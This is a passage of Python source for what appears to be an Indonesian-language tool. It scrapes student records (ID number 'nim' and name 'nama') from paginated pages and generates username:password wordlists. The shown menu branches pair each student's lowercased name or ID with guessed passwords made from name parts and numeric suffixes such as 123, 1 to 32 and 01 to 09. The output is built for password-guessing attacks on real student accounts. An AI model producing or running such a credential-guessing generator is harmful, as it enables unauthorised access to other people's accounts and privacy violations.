		print(f'{B}[{W}+{B}]{W} Total {B}{_3} {W}Halaman Terdeteksi')
		print("")
		for _ in range(int(_3)):
			print(f"{B}[{W}+{B}]{W} Sukses Membuat Wordlist Dari Halaman Ke  {B}{_+1}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			___ = json.loads(json.dumps(yxc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					 o_.write(x[0].lower()+':'+x[0].title()+'123\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'1234\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'12345\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'123456\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'1234567\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'12345678\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'123456789\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'123\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'1234\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'12345\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'123456\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'1234567\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'12345678\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'123456789\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'123\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'1234\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'12345\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'123456\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'1234567\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'12345678\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'123456789\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'1\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'2\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'3\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'4\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'5\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'6\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'7\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'8\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'9\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'01\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'02\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'03\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'04\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'05\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'06\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'07\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'08\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'09\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'10\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'11\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'12\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'13\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'14\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'15\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'16\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'17\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'18\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'19\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'20\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'21\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'22\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'23\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'24\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'25\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'26\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'27\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'28\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'29\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'30\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'31\n')
					 o_.write(x[0].lower()+':'+x[0].title()+'32\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'1\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'2\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'3\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'4\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'5\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'6\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'7\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'8\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'9\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'01\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'02\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'03\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'04\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'05\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'06\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'07\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'08\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'09\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'10\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'11\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'12\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'13\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'14\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'15\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'16\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'17\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'18\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'19\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'20\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'21\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'22\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'23\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'24\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'25\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'26\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'27\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'28\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'29\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'30\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'31\n')
					 o_.write(x[0].lower()+':'+x[1].title()+'32\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'1\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'2\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'3\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'4\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'5\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'6\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'7\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'8\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'9\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'01\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'02\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'03\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'04\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'05\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'06\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'07\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'08\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'09\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'10\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'11\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'12\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'13\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'14\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'15\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'16\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'17\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'18\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'19\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'20\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'21\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'22\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'23\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'24\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'25\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'26\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'27\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'28\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'29\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'30\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'31\n')
					 o_.write(x[0].lower()+':'+x[2].title()+'32\n')
			except:
				continue
		done(_2)
	elif _0 == '5':
		print(f'{B}[{W}+{B}]{W} Total {B}{_3} {W}Halaman Terdeteksi')
		print("")
		for _ in range(int(_3)):
			print(f"{B}[{W}+{B}]{W} Sukses Membuat Wordlist Dari Halaman Ke  {B}{_+1}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			___ = json.loads(json.dumps(yxc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'123\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'1234\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'12345\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'123456\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'1234567\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'12345678\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'123456789\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'123\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'1234\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'12345\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'123456\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'1234567\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'12345678\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'123456789\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'123\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'1234\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'12345\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'123456\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'1234567\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'12345678\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'123456789\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'1\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'2\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'3\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'4\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'5\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'6\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'7\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'8\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'9\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'01\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'02\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'03\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'04\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'05\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'06\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'07\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'08\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'09\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'10\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'11\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'12\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'13\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'14\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'15\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'16\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'17\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'18\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'19\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'20\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'21\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'22\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'23\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'24\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'25\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'26\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'27\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'28\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'29\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'30\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'31\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'32\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'1\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'2\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'3\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'4\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'5\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'6\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'7\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'8\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'9\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'01\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'02\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'03\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'04\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'05\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'06\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'07\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'08\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'09\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'10\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'11\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'12\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'13\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'14\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'15\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'16\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'17\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'18\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'19\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'20\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'21\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'22\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'23\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'24\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'25\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'26\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'27\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'28\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'29\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'30\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'31\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].lower()+'32\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'1\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'2\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'3\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'4\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'5\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'6\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'7\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'8\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'9\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'01\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'02\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'03\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'04\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'05\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'06\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'07\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'08\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'09\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'10\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'11\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'12\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'13\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'14\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'15\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'16\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'17\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'18\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'19\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'20\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'21\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'22\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'23\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'24\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'25\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'26\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'27\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'28\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'29\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'30\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'31\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].lower()+'32\n')
			except:
				continue
		done(_2)
	elif _0 == '7':
		print(f'{B}[{W}+{B}]{W} Total {B}{_3} {W}Halaman Terdeteksi')
		print("")
		for _ in range(int(_3)):
			print(f"{B}[{W}+{B}]{W} Sukses Membuat Wordlist Dari Halaman Ke  {B}{_+1}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			___ = json.loads(json.dumps(yxc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					 o_.write(__+':'+x[0].lower()+'\n')
					 o_.write(__+':'+x[1].lower()+'\n')
					 o_.write(__+':'+x[2].lower()+'\n')
			except:
				continue
		done(_2)
	elif _0 == '8':
		print(f'{B}[{W}+{B}]{W} Total {B}{_3} {W}Halaman Terdeteksi')
		print("")
		for _ in range(int(_3)):
			print(f"{B}[{W}+{B}]{W} Sukses Membuat Wordlist Dari Halaman Ke  {B}{_+1}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			___ = json.loads(json.dumps(yxc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					 o_.write(x[0].lower()+':'+x[1].lower()+'\n')
					 o_.write(x[0].lower()+':'+x[2].lower()+'\n')
					 o_.write(x[0].lower()+':'+x[0].lower()+'\n')
			except:
				continue
		done(_2)
	elif _0 == '6':
		print(f'{B}[{W}+{B}]{W} Total {B}{_3} {W}Halaman Terdeteksi')
		print("")
		for _ in range(int(_3)):
			print(f"{B}[{W}+{B}]{W} Sukses Membuat Wordlist Dari Halaman Ke  {B}{_+1}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			___ = json.loads(json.dumps(yxc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].lower()+'123\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'123\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'1234\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'12345\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'123456\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'1234567\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'12345678\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'123456789\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'123\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'1234\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'12345\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'123456\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'1234567\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'12345678\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[1].title()+'123456789\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'123\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'1234\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'12345\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'123456\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'1234567\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'12345678\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[2].title()+'123456789\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'1\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'2\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'3\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'4\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'5\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'6\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'7\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'8\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'9\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'01\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'02\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'03\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'04\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'05\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'06\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'07\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'08\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'09\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'10\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'11\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'12\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'13\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'14\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'15\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'16\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'17\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'18\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'19\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'20\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'21\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'22\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'23\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'24\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'25\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'26\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'27\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'28\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'29\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'30\n')
					 o_.write(x[0].lower()+'.'+x[1].lower()+':'+x[0].title()+'31\n')
